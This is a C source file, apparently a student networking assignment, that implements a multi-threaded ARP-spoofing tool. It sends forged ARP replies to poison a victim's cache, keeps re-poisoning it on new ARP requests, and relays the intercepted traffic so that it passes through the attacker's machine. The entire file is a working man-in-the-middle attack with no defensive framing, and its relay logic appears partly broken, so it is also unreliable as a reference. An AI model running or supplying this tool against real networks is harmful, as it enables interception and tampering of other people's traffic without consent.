#include "arp_spoof.h"

void make_arp(u_int8_t *packet, u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *src_ip, u_int8_t *dst_ip, u_int16_t opcode){
    struct arp_packet *arp = (struct arp_packet *)malloc(sizeof(struct arp_packet));
                
    arp->ether_type      = htons(0x0806);
    arp->hw_type         = htons(1);
    arp->prot_type       = htons(0x0800);
    arp->hw_addr_size    = 6;
    arp->prot_addr_size  = 4;
    arp->op              = htons(opcode);
                           
    if(dst_mac != NULL) memcpy(arp->targ_hw_addr, dst_mac, 6);				
    else memcpy(arp->targ_hw_addr, "\xff\xff\xff\xff\xff\xff", 6);			// broadcast

    memcpy(arp->src_hw_addr, src_mac, 6);
    if(dst_mac != NULL) memcpy(arp->rcpt_hw_addr, dst_mac, 6);
    else memcpy(arp->rcpt_hw_addr, "\x00\x00\x00\x00\x00\x00", 6);			// broadcast
    memcpy(arp->sndr_hw_addr, src_mac, 6);
    memcpy(arp->rcpt_ip_addr, dst_ip, 4);
    memcpy(arp->sndr_ip_addr, src_ip, 4);
    memcpy(packet, arp, sizeof(struct arp_packet));
    free(arp);
}

void get_target_mac(pcap_t *handler, u_int8_t *interface, u_int8_t *target_ip, u_int8_t *target_mac, u_int8_t *attacker_ip, u_int8_t *attacker_mac){
    struct arp_packet *arp;
    struct pcap_pkthdr *header;
    const u_char *packet_recv;
    u_char packet[42];
    int length = sizeof(struct arp_packet);
    
    make_arp(packet, attacker_mac, NULL, attacker_ip, target_ip, 1);
    if(pcap_sendpacket(handler, packet, length) != 0){                      //arp broadcast
        printf("\nError Sending the packet\n");
        return;
    }

    while(1){                                                                //get arp reply
        pcap_next_ex(handler, &header, &packet_recv);
        arp = (struct arp_packet*)packet_recv;  
        if(ntohs(arp->ether_type) != ETHERTYPE_ARP) continue;
        if(ntohs(arp->op) != 2) continue;
        if(memcmp(arp->sndr_ip_addr, target_ip, 4)) continue;
        memcpy(target_mac, arp->sndr_hw_addr, 6);
        break;   
    }
    printf("get well\n\n");
}

int attack(pcap_t *handler, u_int8_t *attacker_mac, u_int8_t *sender_mac, u_int8_t *target_mac, u_int8_t *attcker_ip, u_int8_t *sender_ip, u_int8_t *target_ip){
    struct pcap_pkthdr* header;
    const u_char *packet_recv;
    struct ether_packet *ethhdr;
    struct ip *iphdr;
    struct arp_packet *arp;
    int flag = 0;
    u_char packet[42];
    
    //infect first
    make_arp(packet, attacker_mac, sender_mac, target_ip, sender_ip, 2);
    if(pcap_sendpacket(handler, packet, 42) !=0){
        printf("\nInfection Failed\n");
        return -1;
    }
    
    //after infection
    while(flag >= 0){
        flag = pcap_next_ex(handler, &header, &packet_recv);
        ethhdr = (struct ether_packet*)packet_recv;
        
        if(memcmp(ethhdr->src_hw_addr, sender_mac, 6)) continue;   // not from sender
        
        if(ethhdr->ether_type == htons(ETHERTYPE_IP)){
            iphdr = (struct ip*)(packet_recv + sizeof(struct ether_packet));       // packet to me(don't have to attack)
            if(!memcmp(&iphdr->ip_dst, attcker_ip, INET_ADDRSTRLEN)) continue;
        }
        
        if(ethhdr->ether_type == htons(ETHERTYPE_ARP)){                             // capture arp request
            arp = (struct arp_packet*)packet_recv;    
            if(arp->hw_type == htons(ARPHRD_ETHER) && arp->op == 1){
                if(!memcmp(ethhdr->src_hw_addr, "\xff\xff\xff\xff\xff\xff", 6) ||   //broadcast or arp(sender->target) 
                 ((!memcmp(arp->sndr_ip_addr, sender_ip, 4) && !memcmp(arp->rcpt_ip_addr,target_ip, 4)))){
                    make_arp(packet, attacker_mac, sender_mac, target_ip, sender_ip, 2);
                    if(pcap_sendpacket(handler, packet, 42)!= 0){
                        printf("\nInfection Failed\n");
                        return -1;
                    }
                }        
            }
        }else{								// relaying
            ethhdr = (struct ether_packet*)packet;   
            memcpy(ethhdr->targ_hw_addr, attacker_mac, 6);
            memcpy(ethhdr->src_hw_addr, target_mac, 6);

            if(pcap_sendpacket(handler, packet, header->caplen) !=0){
                printf("\nRelaying Failed\n");
                return -1;
            }
        }
    }
    return 0;
}


void *thread_func(void *arg){
    pcap_t *handler;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct thread_args *args = (struct thread_args*)arg; 
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    u_char *interface;
    u_int8_t attacker_mac[6];
    u_int8_t attacker_ip[4];
    u_int8_t sender_mac[6];
    u_int8_t sender_ip[4];
    u_int8_t target_mac[6];
    u_int8_t target_ip[4];
   
    interface = args->interface;
    inet_pton(AF_INET, args->sender_ip, sender_ip);
    inet_pton(AF_INET, args->target_ip, target_ip);
    
    printf("Thread %d is excuting\n", args->i);

    handler = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    
    //get mac, ip of attacker
    strcpy(ifr.ifr_name, interface);
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) for(int i = 0;i<6;i++) attacker_mac[i] = ifr.ifr_hwaddr.sa_data[i];
    if(ioctl(sock, SIOCGIFADDR, &ifr) == 0) memcpy(attacker_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    close(sock);
                        
    //print mac, ip
    printf("Attacker's MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);    
    printf("Attacker's IP : %d.%d.%d.%d\n", attacker_ip[0], attacker_ip[1], attacker_ip[2], attacker_ip[3]);

    //get sender & target's mac
    get_target_mac(handler, interface, sender_ip, sender_mac, attacker_ip, attacker_mac); 
    get_target_mac(handler, interface, target_ip, target_mac, attacker_ip, attacker_mac);
    printf("Sender's MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
    printf("Target's MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
    
    // atack start
    if(attack(handler, attacker_mac, sender_mac, target_mac, attacker_ip, sender_ip, target_ip) != 0){
        printf("\nAttack Failed\n");
        return (void *)1;
    }
    
    return (void*)0;
}

int main(int argc, char *argv[]){
    int ret;
    pthread_t thread[5];
    struct thread_args args[5];
    const char *name = "Kim Subong";
    printf("[sub26_2017]send_arp[%s]\n", name);
    
    //save arguments to 'thread_args' struct
    printf("\nThread Start\n");
    for(int i = 0; i*2+2<argc;i++){
        args[i].i = i;
        args[i].interface = argv[1];
        args[i].sender_ip = argv[i*2+2];
        args[i].target_ip = argv[i*2+3];
                                
	// call thread function
        if(pthread_create(&thread[i], NULL, &thread_func, (void*)&args[i])){
            printf("\nThread Failed\n");
            return -1;
        }
    }
                                                                                                      
    for(int i = 0; i*2+2 <argc; i++){
        pthread_join(thread[i], (void**)&ret);
    }
    printf("\nThread Finished\n");
    return 0;
}
